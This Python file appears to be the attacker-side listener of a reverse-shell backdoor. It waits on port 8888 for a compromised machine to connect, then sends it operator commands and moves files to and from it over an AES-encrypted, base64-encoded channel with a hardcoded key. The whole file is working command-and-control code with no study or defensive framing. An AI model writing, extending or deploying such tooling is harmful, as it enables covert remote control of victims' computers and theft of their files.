import socket
import base64
from Encryptor import AES_Encryption
import traceback
import os


class bcolors:

    WHITE = "\033[1;37m"
    GREEN = "\033[1;32m"
    RED = "\033[1;31m"
    BOLD = '\033[1m'


class Listener:

    formatting = "utf-8"

    def __init__(self, ip, port):
        os.system("chcp 65001")
        self.key = "key"
        self.iv = "initializaition vector"
        self.cipher = AES_Encryption(key=self.key, iv=self.iv)
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(1)
        print(bcolors.GREEN + bcolors.BOLD)
        print("[+] Waiting for incoming connnections")
        self.connection, address = listener.accept()
        print("[+] Got a connection from " + str(address))
        print(bcolors.WHITE + bcolors.BOLD)

    def encrypt_stuff(self, data):
        return self.cipher.encrypt(data)

    def decrypt_stuff(self, data):
        return self.cipher.decrypt(data)

    def execute_obtain_an_answer_and_return_it(self, data):
        self.reliable_send(data)
        return self.reliable_receive()

    def change_working_directory(self, path):
        os.chdir(path)
        return "[+] Changing working directory to " + path

    def reliable_send(self, data):
        base64_data = self.string_to_base64_sting(data)
        encrypted_data = self.cipher.encrypt(base64_data)
        data_length = len(encrypted_data)
        string_dara_length = str(data_length)
        #Padding len data so the client dosent get confuse and mix this with the actuall data.
        #This is important if the windows is non-english
        while len(string_dara_length) < 1024:
            string_dara_length += 'A'
        self.connection.send(self.cipher.encrypt(string_dara_length))
        self.connection.send(encrypted_data)

    def reliable_receive(self):
        data_length_encrypted = self.connection.recv(1024)
        print(data_length_encrypted)
        print(self.decrypt_stuff(data_length_encrypted))
        data_length = self.decrypt_stuff(data_length_encrypted).strip("A")
        print(data_length)
        encrypted_data = self.connection.recv(int(data_length))
        print(encrypted_data)
        decrypted_data = self.decrypt_stuff(encrypted_data)
        print(decrypted_data)
        return decrypted_data

    def string_to_base64_sting(self, data):
        return base64.b64encode(bytes(data, self.formatting)).decode()

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return ("[+] Download successful")

    def read_file(self, path):
        with open(path, "rb") as file:
            data = file.read()
            string_base64_data = base64.b64encode(data).decode('ascii')
            return string_base64_data

    def run(self):

        while True:
            command = input(">> ")
            while not (command and command.strip()):
                command = input(">> ")
            try:

                if command[0:6] == "upload":

                    file_content = self.read_file(command[7:])

                    command = command + " " + file_content

                    result = self.execute_obtain_an_answer_and_return_it(command)

                elif command[0:8] == "download":
                    result = self.execute_obtain_an_answer_and_return_it(command)
                    result = base64.b64decode(result).decode(self.formatting)
                    if "[-] Error " not in result:
                        result = self.write_file(command[9:], result)
                else:
                    #encode command to base64
                    #base64_encoded_command = base64.b64encode(bytes(command, self.formatting)).decode()
                    result = self.execute_obtain_an_answer_and_return_it(command)
                    print("I will try decode this ", result)
                    result = base64.b64decode(result).decode(self.formatting)
                print(bcolors.GREEN + bcolors.BOLD)
                print(result)
                print(bcolors.WHITE + bcolors.BOLD)
            except:
                print(bcolors.RED + bcolors.BOLD)
                result = "[-] Error during command execution. in Server " + traceback.format_exc()
                print(bcolors.WHITE + bcolors.BOLD)
                print(result)


while True:
    try:
        listener = Listener("0.0.0.0", 8888)
        listener.run()
    except:
        continue
